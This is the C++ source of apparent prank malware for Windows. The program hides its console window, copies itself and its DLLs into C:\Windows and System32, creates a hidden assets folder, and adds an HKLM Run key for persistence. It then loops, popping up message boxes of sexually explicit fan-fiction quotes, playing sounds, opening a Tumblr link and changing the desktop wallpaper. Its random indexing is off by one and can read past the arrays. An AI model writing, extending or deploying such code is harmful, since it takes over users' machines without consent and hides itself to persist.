#include <Windows.h>
#include <time.h>
#include <iostream>
#include <vector>

//Variables
char* backupPath1 = "C:\\Windows\\bb_lne.exe";
HKEY startup1;

char* gayQuotes[] =
{
	//Bubbline
	"If you kiss a vampire, do the fangs get in the way? Scientific queries such as this interests Princess Bubblegum.",
	"Marceline stalked away into the night, leaving Bonnibel in front of her building shocked, confused, and just a little turned on.",
	"“Don’t you play dumb with me!” Bonnibel retorted. “You’re doing it on purpose. I mean, come on. Those clothes?” It was like she was trying to classically seduce her.",
	"Marceline reached over and tucked Bonnibel’s hair behind her hair, revealing more of her face hidden by her hair. “You know, you look a lot less uptight when you’re blushing. It’s cute.”",
	"“My gourds.” Marceline looked horrified all of a sudden and Bonnibel didn’t know whether she should laugh or hug her tighter. She did a little of both. “He’s going to put my gourds to shame, Bonnie. To shame.”",
	"Marceline’s face finally softens and she kisses her wife gently with a sigh. “What else happened today, love?”",

	//Jean x Marco
	"Marco and Jean suddenly made eye contact",
	"Marco's warm, wet tongue darted into Jean's mouth",
	"Jean slowly travelled his way down to Marco's neck, slowly kissing and nibbling up and down and centering his attention on his collarbone. Jean left trails of red marks on his tanned neck.",
	"His hot tongue darted out to flick at Jean's hardening nubs.",
	"'Mhnn~ Don't be such a tease Jean!' Marco whined seductively.",
	"'Jeahh..nnn mhnn, I'm g-gon-n-' Marco moaned helplessly.",

	//Sledgefu
	"Snafu moaned and let out a string of gibberish, half English, half bastard French that Eugene didn’t have the mental capacity to even try and translate. He understood anyway.",
	"“You like this, yeah?” he asked breathlessly.",
	"“Yeah…Eugene, it’s…finally…so good, but…”",
	"“More” Snafu gasped. “Need us some more, Sledgehamma” he muttered against Eugene’s lips.",

	//other crap
	"while i was walking in a crowd i just heard a dude say “man your so gay” in a joking way and i looked up to see he was talking to a guy who’s holding  another dude’s hand. He gently brought up it up to kiss it and gave the happiest grin before saying “yeah i know”",
	"There was once a boi naemd Matt, who longed 4 a cocc so fatt. Longed 4 it 2 be long, against his lacy, thin thong. O, this thirsty, fatt boi naemd Matt!"
};

char* links[] =
{
	"http:////lgbtposts.tumblr.com//"
};




void MakeDirectory(char* DirectoryName, int FileAttribute)
{
	CreateDirectory(DirectoryName, NULL);
	SetFileAttributes(DirectoryName, FileAttribute);
}


int GetRandInt(int add, int limit)
{
	return rand() % limit + add;
}


//improve this function for overall folder control
void CopyAssets(char* path)
{
	WIN32_FIND_DATA file;
	HANDLE search_handle = FindFirstFile("assets\\*", &file);
	char cf[255];
	char cd[255];

	if (search_handle)
	{
		do
		{
			memset(cf, 0, sizeof cf);
			strcat(cf, "assets\\");
			strcat(cf, file.cFileName);

			memset(cd, 0, sizeof cd);
			strcat(cd, path);
			strcat(cd, "\\");
			strcat(cd, file.cFileName);

			CopyFile(cf, cd, false);
			//std::cout << "file: " << cf << std::endl;
			//std::cout << "destination: " << cd << std::endl;
		} while (FindNextFile(search_handle, &file));
		CloseHandle(search_handle);

	}
}


void CopyDependencies(char* path)
{
	WIN32_FIND_DATA file;
	HANDLE search_handle = FindFirstFile("*.dll", &file);
	char cd[255];

	if (search_handle)
	{
		do
		{
			memset(cd, 0, sizeof cd);
			strcat(cd, path);
			strcat(cd, "\\");
			strcat(cd, file.cFileName);

			CopyFile(file.cFileName, cd, false);
			//std::cout << "file: " << cf << std::endl;
			//std::cout << "destination: " << cd << std::endl;
		} while (FindNextFile(search_handle, &file));
		CloseHandle(search_handle);

	}
}


std::string ReturnName(char* path)
{
    WIN32_FIND_DATA file;
	HANDLE search_handle = FindFirstFile(path, &file);
	std::vector<std::string> names;

	if (search_handle)
	{
		do
        {
            //std::cout << file.cFileName << std::endl;
            names.push_back(file.cFileName);
		} while (FindNextFile(search_handle, &file));
		CloseHandle(search_handle);

	}

	return names[GetRandInt(1, names.size())];
}


void Stealth()
{
	HWND hWnd;
	AllocConsole();
	hWnd = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hWnd, 0);
}


int InitialInfection(int argc, char **argv)
{
	//Backup EXE
	CopyFile(argv[0], backupPath1, false);

	//Copy Dependencies
	CopyDependencies("C:\\Windows\\System32");

	//Copy Assets
	MakeDirectory("C:\\Windows\\assets", FILE_ATTRIBUTE_HIDDEN);
	CopyAssets("C:\\Windows\\assets");

	//Setup startup key
	RegCreateKeyExA(
		HKEY_LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&startup1,
		NULL);
	RegSetValueEx(startup1, "gayoverstraight", 0, REG_SZ, (LPBYTE)backupPath1, strlen(backupPath1) + 1);
	RegCloseKey(startup1);
}


int main(int argc, char **argv)
{
    srand(193756);

    Stealth();
	InitialInfection(argc, argv);

	int timeSinceElapsed = 0;

	while (true)
	{
		Sleep(1); timeSinceElapsed++;

		//Dialogue Payload
		if (timeSinceElapsed % (60000 * 10) == 0)
		{
			MessageBox(NULL, gayQuotes[GetRandInt(1, sizeof(gayQuotes) / sizeof(gayQuotes[0]))], "Straight People are Boring", MB_ICONASTERISK);
			PlaySound(ReturnName("assets\\*.wav").c_str(), NULL, SND_FILENAME);
		}

		//Link Payload
		if (timeSinceElapsed % (60000 * 60) == 0)
		{
			ShellExecute(0, 0, links[GetRandInt(1, sizeof(links) / sizeof(links[0]))], 0, 0, SW_SHOW);
			timeSinceElapsed = 0;
		}

		//Background Payload
		if (timeSinceElapsed % (60000 * 30) == 0)
			SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)ReturnName("assets\\*.jpg").c_str(), SPIF_UPDATEINIFILE);
	}
}
